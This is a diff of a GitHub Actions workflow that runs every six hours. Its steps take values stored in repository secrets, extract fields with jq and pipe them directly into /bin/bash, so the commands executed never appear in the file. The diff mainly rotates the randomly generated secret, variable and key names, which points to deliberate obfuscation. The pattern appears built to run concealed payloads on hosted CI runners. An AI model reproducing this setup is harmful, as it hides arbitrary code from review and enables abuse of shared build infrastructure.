@@ -3,16 +3,18 @@ name: guoweina7816
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
-jobs:  # 8920
+    - cron: '8 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: guoweina7816
         env:
-          ws0799: ${{ secrets.ws0799 }}
+          qp6810: ${{ secrets.qp6810 }}
         run: |
-          echo $ws0799 | jq -r .pzavo8959 | /bin/bash
-          echo $wgec0774 | jq -r .xdaw69 | /bin/bash
+          echo $qp6810 | jq -r .l4814 | /bin/bash
+          echo $wk857 | jq -r .tkbs3 | /bin/bash
+          echo $vdtyw8 | jq -r .wfewa074 | /bin/bash
+          echo $kdgsm31359 | jq -r .vaifs619 | /bin/bash
 
